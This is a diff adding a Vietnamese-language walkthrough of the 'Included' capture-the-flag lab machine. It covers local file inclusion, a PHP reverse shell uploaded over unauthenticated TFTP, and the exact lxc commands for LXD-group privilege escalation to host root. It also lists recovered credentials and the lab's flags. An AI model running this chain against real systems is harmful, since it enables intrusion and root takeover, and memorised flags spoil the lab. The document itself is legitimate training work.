@@ -756,3 +756,104 @@ export TERM=xterm
 ![1774176053208](image/Report/1774176053208.png)
 ![1774176072245](image/Report/1774176072245.png)
 ![1774176082012](image/Report/1774176082012.png)
+
+## 7.Included
+
+### Task 1: What service is running on the target machine over UDP?
+
+- Dùng nmap để scan: `nmap -sU -Pn 10.129.10.209`
+![1774281357952](image/Report/1774281357952.png)
+
+> tftp
+
+### Task 2: What class of vulnerability is the webpage that is hosted on port 80 vulnerable to?
+
+- Vừa vào giao diện web thì thấy URL lộ ra hướng tấn công `Local File Inclusion`: Web lấy giá trị của biến `file` và chèn trực tiếp vào đường dẫn file trên server.
+![1774281954442](image/Report/1774281954442.png)
+
+> Local File Inclusion
+
+### Task 3: What is the default system folder that TFTP uses to store files?
+
+![1774282174824](image/Report/1774282174824.png)
+> /var/lib/tftpboot/
+
+### Task 4: Which interesting file is located in the web server folder and can be used for Lateral Movement?
+
+- Dùng gobuster để scan thử các thư mục thú vị trên servser:
+![1774282923203](image/Report/1774282923203.png)
+
+> Không có gì đặc biệt
+
+- Ở task 2 ta đã biết web này có thể bị tấn công `LFI`, vậy nên thử sửa biến `file=/etc/passwd`:
+![1774282994764](image/Report/1774282994764.png)
+
+> Hiện tại thông tin này vẫn chưa có giá trị
+
+- Sau khi tìm hiểu thì biết được giao thức `tftp` cho phép tải file lên mà không cần đăng nhập, khả năng có thể reverse shell
+- Tiến hành kết nối `tftp` và tải lên `rev.php`, sau đó mở cổng `1234` để lắng nghe
+- Task 3 ta đã biết file được tải lên sẽ được lưu ở `/var/lib/tftpboot/`, vậy nên ta sửa biến `file` truy vấn đến `/var/lib/tftpboot/rev.php` nhằm kích hoạt file reverse shell vừa tải lên:
+![1774283680128](image/Report/1774283680128.png)
+
+> Đã chiếm được shell
+
+- Ở tại folder vừa vào thì ta đã tìm được đáp án:
+![1774283992284](image/Report/1774283992284.png)
+
+> .htpasswd
+
+### Task 5: What is the group that user Mike is a part of and can be exploited for Privilege Escalation?
+
+- Ở task 4 ta đã thu được tài khoản của Mike: `mike:Sheffield19`
+- Dùng lệnh `id` thì biết được mike thuộc group `lxd`:
+![1774284456888](image/Report/1774284456888.png)
+- Dùng tài khoản đó để đăng nhập, tranh thủ tìm user flag:
+![1774284316444](image/Report/1774284316444.png)
+
+> User flag: a56ef91d70cfbf2cdb8f454c006935a1
+
+### Task 6: When using an image to exploit a system via containers, we look for a very small distribution. Our favorite for this task is named after mountains. What is that distribution name?
+
+![1774284924271](image/Report/1774284924271.png)
+> Alpine
+
+### Task 7: What flag do we set to the container so that it has root privileges on the host system?
+
+![1774285316036](image/Report/1774285316036.png)
+> security.privileged=true
+
+### Task 8: If the root filesystem is mounted at /mnt in the container, where can the root flag be found on the container after the host system is mounted?
+
+- Đơn giản là root flag được chứa ở thư mục home của root
+
+> /mnt/root/
+
+### User flag?
+
+- Đã tìm được ở task 5
+
+> a56ef91d70cfbf2cdb8f454c006935a1
+
+### Root flag?
+
+- Từ các task trước phát hiện ra Mike thuộc group `lxd` và có thể dùng `lxd` một cách thoải mái
+- Và `lxd` thì luôn chạy với quyền root, có thể tận dụng điểm này để leo quyền
+- Tại máy cá nhân tải về 2 file `lxd.tar.xz` và `rootfs.squashfs` (Bước đệm đẩy file lên server)
+- Mở một máy chủ truyền tệp:
+![1774286570476](image/Report/1774286570476.png)
+- Đăng nhập tài khoản mike và tải về 2 tệp đó
+![1774286906799](image/Report/1774286906799.png)
+- Nhập image vào hệ thống `lxc image import incus.tar.xz rootfs.squashfs --alias alpine`
+- Khởi tạo container có đặc quyền `lxc init alpine privesc -c security.privileged=true`
+- Gắn hệ thống tệp của máy chủ vào container `lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true`
+- Chạy container `lxc start privesc` và vào shell của container `lxc exec privesc /bin/sh`
+- Như đã giải thích ở các task trước thì container này chạy với quyền root, ta có thể đọc root flag bằng lệnh `cat /mnt/root/root/root.txt`
+![1774287119178](image/Report/1774287119178.png)
+
+> c693d9c7499d9f572ee375d4c14c7bcf
+
+### Tổng kết kết quả
+
+![1774287189882](image/Report/1774287189882.png)
+![1774287213102](image/Report/1774287213102.png)
+![1774287231256](image/Report/1774287231256.png)
